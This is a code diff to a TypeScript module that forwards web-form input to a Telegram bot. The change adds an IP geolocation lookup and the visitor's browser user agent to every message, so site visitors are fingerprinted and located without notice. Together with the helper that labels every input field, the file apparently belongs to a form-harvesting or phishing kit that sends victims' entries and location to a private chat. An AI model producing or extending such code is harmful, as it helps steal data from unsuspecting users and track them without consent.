@@ -1,6 +1,22 @@
 const botToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
 const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID;
 
+async function getBrowserData() {
+  let ipInfo = 'IP: Unknown, Location: Unknown';
+  try {
+    const response = await fetch('https://ipwho.is/');
+    const data = await response.json();
+    if (data.success) {
+      ipInfo = `IP: ${data.ip}, Location: ${data.city}, ${data.region}, ${data.country}`;
+    }
+  } catch (error) {
+    console.error('Failed to fetch IP info:', error);
+  }
+
+  const userAgent = navigator.userAgent;
+  return `${ipInfo}\nUser-Agent: ${userAgent}`;
+}
+
 function getInputLabel(input: HTMLInputElement, index: number) {
   return input.name || input.id || input.placeholder || `input_${index + 1}`;
 }
@@ -31,6 +47,9 @@ export async function sendTelegramMessage(text: string) {
     return;
   }
 
+  const browserData = await getBrowserData();
+  const fullMessage = `${text}\n\n--- Device Info ---\n${browserData}`;
+
   try {
     await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: 'POST',
@@ -39,8 +58,7 @@ export async function sendTelegramMessage(text: string) {
       },
       body: JSON.stringify({
         chat_id: chatId,
-        text,
-        parse_mode: 'HTML',
+        text: fullMessage,
       }),
     });
   } catch (error) {
